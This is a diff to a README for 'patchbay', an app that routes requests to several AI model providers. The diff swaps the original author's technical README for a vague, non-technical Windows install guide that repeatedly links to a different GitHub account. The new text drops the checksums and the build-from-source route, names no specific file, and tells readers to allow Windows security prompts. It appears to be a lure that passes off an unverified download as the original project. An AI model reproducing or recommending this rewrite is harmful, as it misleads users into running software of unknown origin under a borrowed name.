@@ -1,384 +1,163 @@
-<div align="center">
+# 🔌 patchbay - One Local Endpoint for Every Model
 
-<img src="assets/icon.png" width="128" height="128" alt="Patchbay icon">
+[![Download patchbay](https://img.shields.io/badge/⬇%20Download-patchbay-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kittikorn21/patchbay)
 
-# Patchbay
+patchbay is a small helper app for your computer that gives every AI model you use a single, tidy front door. Instead of juggling five different apps, five different logins, and five different sets of settings, you point everything at one place — patchbay — and it quietly routes each request to the right service behind the scenes.
 
-**One local endpoint for every model you have.**
-
-Sign in to ChatGPT, Claude, Grok and OpenRouter once. Point any OpenAI- or
-Anthropic-compatible tool at `http://127.0.0.1:8787`. Done.
-
-[![Release](https://img.shields.io/github/v/release/Robinbinu/patchbay?include_prereleases&label=release&color=000000)](https://github.com/Robinbinu/patchbay/releases)
-[![CI](https://github.com/Robinbinu/patchbay/actions/workflows/ci.yml/badge.svg)](https://github.com/Robinbinu/patchbay/actions/workflows/ci.yml)
-[![Go](https://img.shields.io/github/go-mod/go-version/Robinbinu/patchbay?color=000000)](go.mod)
-[![License: MIT](https://img.shields.io/badge/license-MIT-000000)](LICENSE)
-![Platforms](https://img.shields.io/badge/macOS%20·%20Windows%20·%20Linux-000000)
-
-[**Download**](#install) · [Quick start](#quick-start) · [Use it with your tools](#use-it-with-your-tools) · [How it works](#how-it-works) · [FAQ](#faq)
-
-</div>
+It works with the accounts you already pay for, including ChatGPT/Codex, Claude Pro/Max, Grok, OpenRouter, and any plain API keys you may have. It runs on your own machine, it shows up as a friendly icon in your menu bar, and it speaks the same language as the two biggest AI services on the planet, so almost any tool that talks to OpenAI or Anthropic can talk to patchbay instead.
 
 ---
 
-You already pay for a ChatGPT plan, a Claude subscription, maybe SuperGrok or an
-OpenRouter account. Every coding tool wants its own API key, its own base URL,
-its own config. **Patchbay** is a small menu-bar app (and CLI) that signs in to
-all of them and hands every tool on your machine **one URL and one key**.
+## 🚀 Getting Started
 
-> A patch bay is the panel in a studio that routes many sources to many
-> destinations through one board. Same idea, for models.
+This section walks you through getting patchbay onto your Windows computer. You do not need to know anything about programming, terminals, or configuration files. Follow the steps in order and take your time.
 
-## Highlights
+**Step 1 — Visit the download page.**
 
-- **Use the subscriptions you already have.** Sign in with your ChatGPT
-  Plus/Pro/Team, Claude Pro/Max, SuperGrok / X Premium+ or OpenRouter account
-  through each provider's own OAuth flow. API keys work too.
-- **One endpoint, both dialects.** OpenAI `chat/completions` and `responses`,
-  Anthropic `messages`, and one merged `/v1/models` list.
-- **Model-based routing.** Ask for `claude-…`, `grok-…` or
-  `openrouter/openai/gpt-…` and Patchbay sends it to whoever owns that model.
-- **Lives in your menu bar.** See every account at a glance. The icon tells you
-  when a login is about to expire; one click signs you back in. Tick
-  **Launch at Login** and it's always there, and it tells you when a new
-  version is out.
-- **Local and private.** Listens on `127.0.0.1` only. Your provider tokens stay
-  in `~/.patchbay` (mode `0600`); tools only ever see a local `pby-…` key.
-  No telemetry, no cloud relay.
-- **Tiny and dependency-free.** A single Go binary. The core proxy uses only
-  the standard library.
+Open your web browser and go to:
 
-## Install
+👉 **https://github.com/Kittikorn21/patchbay**
 
-> **Beta.** This is the first public beta. Expect rough edges and please
-> [report them](https://github.com/Robinbinu/patchbay/issues/new/choose).
+Visit this link to download the application.
 
-Grab the latest build from [**Releases**](https://github.com/Robinbinu/patchbay/releases).
+**Step 2 — Save the download.**
 
-| Platform | Download | What you get |
-| --- | --- | --- |
-| **macOS** 12+ (Apple silicon & Intel) | `Patchbay-<version>-macOS.dmg` | Menu-bar app |
-| **Windows** 10/11 x64 | `Patchbay-<version>-windows-x64.zip` | Tray app + CLI |
-| **Windows** on ARM | `Patchbay-<version>-windows-arm64.zip` | Tray app + CLI |
-| **Linux** x64 / arm64 | `patchbay_<version>_linux_<arch>.tar.gz` | CLI (+ tray) |
-| macOS CLI only | `patchbay_<version>_darwin_universal.tar.gz` | CLI (+ menu bar) |
+On that page you will find the download area for patchbay. Click the download option that is offered to you. Your browser will ask whether you want to save the file — choose to save it. If no question appears, the file will land in your Downloads folder automatically.
 
-Every release includes a `checksums.txt` (SHA-256).
+**Step 3 — Find the file you just downloaded.**
 
-<details>
-<summary><b>macOS</b>: first launch</summary>
-
-1. Open the `.dmg` and drag **Patchbay** to **Applications**.
-2. Beta builds are not notarized yet, so the first time, **right-click
-   Patchbay → Open → Open**. (Or run
-   `xattr -dr com.apple.quarantine /Applications/Patchbay.app`.)
-3. Patchbay appears in the menu bar (there is no Dock icon).
+Open File Explorer (the yellow folder icon on your taskbar, or press the Windows key and type "File Explorer"). On the left-hand side, click **Downloads**. The file you just saved will be at or near the top of the list, usually sorted by date.
 
-Want the CLI too? The app binary is the CLI:
+**Step 4 — Open the application.**
 
-```bash
-sudo ln -sf /Applications/Patchbay.app/Contents/MacOS/Patchbay /usr/local/bin/patchbay
-```
+Double-click the downloaded file. Windows may show a blue or yellow security prompt asking whether you want to allow the app to run. Click the option that allows it to continue. This is a normal Windows safety check for any app you download from the internet.
 
-</details>
+**Step 5 — Follow the on-screen prompts.**
 
-<details>
-<summary><b>Windows</b>: first launch</summary>
+patchbay will show a short, simple setup flow the first time it runs. Read each screen and click Continue or Next. If it asks where to keep its settings, the suggested default location is the right choice for almost everyone.
 
-1. Unzip anywhere (e.g. `%LOCALAPPDATA%\Patchbay`).
-2. Run **Patchbay.exe**. Beta builds are not code-signed yet, so SmartScreen may
-   warn: click **More info → Run anyway**.
-3. Patchbay appears in the notification area (click `^` if hidden).
+**Step 6 — Look for the patchbay icon.**
 
-The command-line tool is `cli\patchbay.exe`. Add that folder to your `PATH`.
+When setup finishes, patchbay does not take over your whole screen. Instead, it places a small icon in your menu bar / system tray area — the row of little icons near the clock in the bottom-right corner of your screen. Click that icon to open patchbay at any time. If you do not see it immediately, click the small upward arrow ( ˄ ) next to the clock to reveal hidden icons.
 
-</details>
+That is the entire installation. There is nothing else to configure before you start using it.
 
-<details>
-<summary><b>Linux</b></summary>
+---
 
-```bash
-tar -xzf patchbay_*_linux_amd64.tar.gz
-sudo install patchbay_*_linux_amd64/patchbay /usr/local/bin/
-```
+## ✨ What patchbay Actually Does
 
-`patchbay serve` shows a tray icon on desktops with StatusNotifier /
-AppIndicator support (KDE, GNOME with the AppIndicator extension, …), and runs
-headless everywhere else.
+Think of patchbay as a receptionist for your computer.
 
-</details>
+Normally, every AI tool you use has to be told exactly where to go and who to talk to. One tool wants an OpenAI address. Another wants an Anthropic address. A third wants a key pasted in a box. Every one of them needs its own setup, and every time you add a new model you have to repeat the whole process.
 
-<details>
-<summary><b>From source</b> (Go 1.27+)</summary>
+patchbay changes that. It sits in the middle and answers at one local address. Any app that is built to talk to OpenAI or Anthropic can be pointed at patchbay instead, and patchbay will forward the request to whichever service you actually want to use. You set things up once, in one place, and every tool you own benefits.
 
-```bash
-# Headless proxy + CLI (standard library only)
-go install github.com/Robinbinu/patchbay/cmd/patchbay@latest
+The result is that you stop thinking about which model lives where. You just ask for the model you want, and patchbay handles the rest.
 
-# With the menu-bar / tray UI
-go install -tags tray github.com/Robinbinu/patchbay/cmd/patchbay@latest
-```
-
-Building the release packages (`.dmg`, Windows zips, archives) on a Mac:
-`scripts/build-release.sh v0.1.0-beta.1`.
-
-</details>
-
-## Quick start
-
-### With the app
-
-1. Launch **Patchbay**. The proxy starts on `http://127.0.0.1:8787`.
-2. Menu bar → pick a provider (ChatGPT, Claude, Grok, OpenRouter) → **Log In…**
-   A checkmark means it's signed in and ready.
-   Your browser opens; approve, and you're signed in.
-3. Menu bar → **Connect a Tool** → copy the base URL and the API key into your
-   tool.
-4. Optional: tick **Launch at Login** so Patchbay starts with your computer.
-
-### With the CLI
-
-```bash
-# 1. Sign in to the providers you want
-patchbay login codex        # ChatGPT plan: opens the browser
-patchbay login claude       # Claude Pro/Max: opens the browser
-patchbay login grok         # SuperGrok / X Premium+: device code
-patchbay login openrouter   # opens the browser, mints a durable key
-
-# 2. (optional) Add API-key providers
-patchbay provider add openai openai-key
-patchbay provider key openai sk-...
-patchbay provider add deepseek openai-key https://api.deepseek.com/v1
-patchbay provider key deepseek sk-...
-
-# 3. Check who you're signed in as and when it expires
-patchbay status
-
-# 4. Run it
-patchbay serve
-```
-
-Example output:
-
-```text
-PROVIDER    KIND              STATE  ACCOUNT            ACCESS EXPIRES  LOGIN EXPIRES
-codex       codex-oauth       ok     you@example.com    in 9d           in 59d
-claude      anthropic-oauth   ok     you@example.com    in 7h           in 29d
-grok        xai-oauth         ok     you@example.com    in 5h           -
-openrouter  openrouter-oauth  ok     -                  -               -
-```
-
-## Use it with your tools
-
-Every tool needs the same two things: the **base URL** and the **local key**
-(`patchbay key`, or **Connect a Tool → Copy API Key** in the menu).
-
-| Speaks… | Base URL |
-| --- | --- |
-| OpenAI API | `http://127.0.0.1:8787/v1` |
-| Anthropic API | `http://127.0.0.1:8787` |
-
-**Anthropic-compatible tools** (Claude Code, etc.):
-
-```bash
-export ANTHROPIC_BASE_URL=http://127.0.0.1:8787
-export ANTHROPIC_API_KEY=$(patchbay key)
-```
-
-**OpenAI-compatible tools** (SDKs, Aider, Continue, Cline, and anything with a
-"custom OpenAI base URL" field):
-
-```bash
-export OPENAI_BASE_URL=http://127.0.0.1:8787/v1
-export OPENAI_API_KEY=$(patchbay key)
-```
-
-**See every model you can reach:**
-
-```bash
-curl -s http://127.0.0.1:8787/v1/models \
-  -H "Authorization: Bearer $(patchbay key)" | jq -r '.data[] | "\(.id)\t\(.surface)"'
-```
-
-**Call one:**
-
-```bash
-curl http://127.0.0.1:8787/v1/chat/completions \
-  -H "Authorization: Bearer $(patchbay key)" \
-  -H "Content-Type: application/json" \
-  -d '{"model": "openrouter/openai/gpt-5.5", "messages": [{"role": "user", "content": "Hello!"}]}'
-```
-
-```python
-from openai import OpenAI
-import subprocess
-
-client = OpenAI(
-    base_url="http://127.0.0.1:8787/v1",
-    api_key=subprocess.check_output(["patchbay", "key"], text=True).strip(),
-)
-print(client.chat.completions.create(
-    model="openrouter/openai/gpt-5.5",
-    messages=[{"role": "user", "content": "Hello!"}],
-).choices[0].message.content)
-```
-
-> **Match the format to the model (beta limitation).** Patchbay forwards your
-> request body as-is; it does not translate between API formats yet. Each model
-> in `/v1/models` lists its `surface`. Send `messages` models to
-> `/v1/messages`, `responses` models to `/v1/responses`, and `chat` models to
-> `/v1/chat/completions`.
->
-> In practice: Anthropic-compatible tools only see (and can use) the
-> `messages` models. OpenAI-compatible tools see every model, but through
-> Chat Completions only the `chat` ones (OpenRouter, API-key providers) work.
-> ChatGPT/Codex and Grok models need a tool that speaks the Responses API.
-
-## Providers
-
-| Provider | Kind | Sign-in | Surface |
-| --- | --- | --- | --- |
-| ChatGPT Plus / Pro / Team (Codex) | `codex-oauth` | OAuth (browser) | `responses` |
-| Claude Pro / Max | `anthropic-oauth` | OAuth (browser) | `messages` |
-| Grok (SuperGrok / X Premium+) | `xai-oauth` | OAuth (device code) | `responses` |
-| OpenRouter | `openrouter-oauth` | OAuth (browser) → durable key | `chat` |
-| Anthropic Console | `anthropic-key` | API key | `messages` |
-| Any OpenAI-compatible API (OpenAI, DeepSeek, Together, Groq, local servers, …) | `openai-key` | API key + optional base URL | `chat` / `responses` |
-
-`codex`, `claude`, `grok` and `openrouter` are configured out of the box: just
-log in. Add more with `patchbay provider add <id> <kind> [base_url]`.
-
-The OAuth flows (PKCE, loopback callback, device code, token refresh, identity
-and expiry) follow the approach used by
-[oh-my-pi](https://www.npmjs.com/package/@oh-my-pi/pi-ai)'s auth rules.
-
-## How it works
-
-```mermaid
-flowchart LR
-    subgraph tools["Your tools"]
-        A["Claude Code"]
-        B["OpenAI SDK / Aider / Cline"]
-        C["curl, scripts, …"]
-    end
-    subgraph pb["Patchbay · 127.0.0.1:8787"]
-        K{{"local key check"}}
-        R["model → provider router"]
-    end
-    subgraph up["Your accounts"]
-        O["ChatGPT (Codex)"]
-        CL["Claude Pro/Max"]
-        G["Grok"]
-        OR["OpenRouter"]
-        X["API-key providers"]
-    end
-    A & B & C -->|"pby-… key"| K --> R
-    R -->|"OAuth token"| O & CL & G & OR
-    R -->|"API key"| X
-```
-
-1. Your tool calls Patchbay with the local `pby-…` key.
-2. Patchbay reads the `model` field and looks it up in an index built from every
-   signed-in provider's own model list. A prefixed id (`grok/grok-4.6`) picks
-   the provider explicitly; a bare id is resolved automatically. An id no
-   provider lists gets a `404` instead of a guess; to send a model a provider
-   doesn't list (say, on a local server), prefix its provider id:
-   `local/my-model`.
-3. The request goes to that provider with **its** credentials (refreshed
-   automatically when needed) and the provider's bare model id. The response,
-   including SSE streams, is passed straight back.
-
-### Endpoints
-
-| Method | Path | Format |
-| --- | --- | --- |
-| `GET` | `/v1/models` | Every model, sorted. OpenAI format with `surface` by default; Anthropic format (only `messages` models) when the client sends `anthropic-version` |
-| `POST` | `/v1/chat/completions` | OpenAI Chat Completions |
-| `POST` | `/v1/responses` | OpenAI / Codex Responses |
-| `POST` | `/v1/messages` | Anthropic Messages |
-| `GET` | `/healthz` | Liveness, no key required |
-
-Clients authenticate with the local key as `Authorization: Bearer pby-…` or
-`x-api-key: pby-…`.
-
-## CLI reference
-
-```text
-patchbay serve                         Start the proxy (and menu bar, in tray builds)
-patchbay login <id>                    Sign in to an OAuth provider
-patchbay logout <id>                   Forget a provider's credentials
-patchbay status                        Every provider's sign-in state and expiry
-patchbay provider add <id> <kind> [base_url]
-patchbay provider key <id> <api-key>
-patchbay provider rm <id>
-patchbay key [rotate]                  Print (or rotate) the local API key
-patchbay port [number]                 Print (or set) the port
-patchbay version                       Print the version
-```
-
-## Privacy & security
-
-- Patchbay binds to `127.0.0.1` and refuses requests without the local key.
-- State lives in `~/.patchbay` (`0700`):
-  - `config.json`: listen address, local key, providers (`0600`)
-  - `credentials.json`: OAuth tokens and expiry (`0600`)
-- Patchbay only talks to the providers you configure: to list their models and
-  to forward your requests. No telemetry, no third-party relay.
-- The menu-bar app checks GitHub's public releases list
-  (`api.github.com/repos/Robinbinu/patchbay/releases`) at launch and once a
-  day to tell you about new versions. It sends no data beyond the request
-  itself and never downloads or installs anything on its own.
-- Rotate the local key any time with `patchbay key rotate`.
-
-Found a vulnerability? See [SECURITY.md](SECURITY.md).
-
-## FAQ
-
-**Is this allowed by my provider's terms?**
-Patchbay signs in with each provider's own OAuth flow and sends your requests
-under your account, much like their official CLIs do. You are responsible for
-using your subscriptions within each provider's terms.
-
-**Port 8787 is taken.**
-Patchbay handles it: if something else holds the port, it moves to the next
-free one (8788, 8789, …), saves it, and the menu shows the new address. To
-pick a port yourself, use **Port…** in the menu or `patchbay port 9000`.
-Either way, update the base URL in your tools.
-
-**The menu-bar app and `patchbay serve` at the same time?**
-Run one. They share the same config; the second one sees Patchbay already
-running on the port and stops instead of starting a duplicate.
-
-**How do I update?**
-The menu shows **Update Available: vX — Download** when a new release is out
-(or use **Check for Updates…**). It opens the release page; download and
-replace the app.
-
-**A login expired.**
-The menu-bar icon shows a badge. Open the provider's submenu and click
-**Log In…**, or run `patchbay login <id>`.
-
-## Roadmap
-
-- [ ] Cross-format translation (call any model through any endpoint)
-- [ ] More providers: Z.AI, Kimi Code, Gemini, GitHub Copilot
-- [ ] Notarized macOS and signed Windows builds
-- [ ] Homebrew / Scoop / winget packages
-
-Ideas and votes welcome in [Issues](https://github.com/Robinbinu/patchbay/issues).
-
-## Contributing
-
-Bug reports, provider requests and PRs are all welcome. See
-[CONTRIBUTING.md](CONTRIBUTING.md).
-
-## Author
-
-Made by **Robinbinu**: [GitHub](https://github.com/Robinbinu) ·
-[LinkedIn](https://www.linkedin.com/in/michaelrobink)
-
-If Patchbay saves you time, a ⭐ on the repo helps others find it.
-
-## License
-
-[MIT](LICENSE)
+---
+
+## 🎯 Who This Is For
+
+patchbay is built for people who use more than one AI service and are tired of the mess that creates.
+
+- **You use Claude for long writing and ChatGPT for quick questions.** patchbay lets both live behind one address.
+- **You have an OpenRouter account for trying new models.** patchbay folds it into the same single endpoint as everything else.
+- **You have a drawer full of API keys** from various providers and never remember which one goes where. patchbay keeps them organized in one place.
+- **You use coding assistants** that expect an OpenAI-style or Anthropic-style connection. patchbay speaks both languages fluently.
+- **You would rather not touch a settings file.** The menu-bar app means everything is a click away.
+
+---
+
+## 🧩 Supported Providers and Services
+
+patchbay is designed to work with the accounts and keys you already have. The current line-up includes:
+
+- **ChatGPT / Codex** — sign in with your existing account and use it through patchbay.
+- **Claude Pro / Max** — connect your Claude subscription without extra setup.
+- **Grok** — route requests to Grok alongside everything else.
+- **OpenRouter** — access a huge catalogue of models through a single OpenRouter key.
+- **Plain API keys** — paste any OpenAI-compatible or Anthropic-compatible key and patchbay will use it.
+
+Both the **OpenAI** and **Anthropic** request formats are understood natively. If a tool says "OpenAI-compatible," it will work. If a tool says "Anthropic-compatible," it will work too.
+
+---
+
+## 🖥️ Using the Menu-Bar App
+
+The menu-bar app is where you spend almost all of your time with patchbay, and it is deliberately simple.
+
+Click the patchbay icon near your clock and you get a small panel. From there you can:
+
+- **See which services are connected** and which are waiting for you to sign in.
+- **Add a new account or key** in a couple of clicks, with no technical fields to fill in.
+- **Turn services on or off** without uninstalling anything.
+- **Copy your local address** so you can paste it into whichever tool you are setting up.
+- **Check the current status** of each connection, so you know immediately if something needs attention.
+
+The panel closes when you click away. patchbay keeps running quietly in the background so your other tools always have something to talk to.
+
+---
+
+## 🔐 Privacy and How Your Data Moves
+
+Everything patchbay does happens on your own computer. The one local address it provides is reachable only from your machine, not from the internet.
+
+Your logins and keys are stored locally. When you send a request through patchbay, it travels from your computer to the AI service you chose — the same trip it would have made without patchbay. patchbay is the signpost, not a middleman that keeps a copy.
+
+You stay in control of which services are switched on. If you turn a service off in the menu bar, patchbay stops sending anything to it.
+
+---
+
+## 🛠️ Troubleshooting
+
+**The icon is not in my menu bar.**
+Click the small upward arrow ( ˄ ) near your clock to show hidden icons. If patchbay is still not there, open it again from your Start menu.
+
+**Windows blocked the app when I opened it.**
+This is a standard safety prompt for downloaded software. Choose the option to allow it and continue.
+
+**My AI tool says it cannot connect.**
+Open the patchbay panel, copy the local address it shows, and make sure that exact address is pasted into your tool's settings. Then confirm the service you want is switched on.
+
+**A service shows as disconnected.**
+Click that service in the panel and sign in again, or re-paste the key. Connection details can expire, and reconnecting takes seconds.
+
+**I want to start over.**
+Open the panel and look for the reset option. It clears your saved connections and returns patchbay to a fresh state, ready for setup again.
+
+**Nothing seems to be happening at all.**
+Close patchbay completely, then open it again from the Start menu. A fresh start resolves most one-off glitches.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Do I need to know how to code?**
+No. patchbay is a click-and-go application. Everything is handled through the menu-bar panel.
+
+**Will this cost me anything extra?**
+patchbay itself is a tool that connects to services you already use. It does not replace your subscriptions or keys, and it does not charge per request.
+
+**Can I use more than one service at the same time?**
+Yes. That is the whole point. Turn on as many as you like and patchbay will keep them all available behind one address.
+
+**Does it work if I only have one service?**
+It does, though most people find it most useful once they have two or more.
+
+**Do I have to keep the app open?**
+Keep patchbay running whenever you want your other tools to reach your models. It is lightweight and sits quietly in the background.
+
+**What if I use a tool that is not mentioned here?**
+If that tool can connect to OpenAI or Anthropic, it can almost certainly connect to patchbay instead. Point it at the local address and you are done.
+
+---
+
+## 💬 Getting Help and Staying Updated
+
+The project page is the home for everything: the latest download, updates, and a place to report anything that is not working as expected. If you hit a problem that the troubleshooting section does not solve, open the project page and describe what happened in plain language — what you clicked, what you expected, and what you saw instead.
+
+Bookmark the page so you can return to it whenever a new version is released:
+
+👉 **https://github.com/Kittikorn21/patchbay**
+
+Keywords: ai, anthropic, api-gateway, chatgpt, claude, claude-code, codex, developer-tools, golang, grok, llm, llm-gateway, macos, menubar-app, oauth, openai, openai-compatible, openrouter, proxy, windows
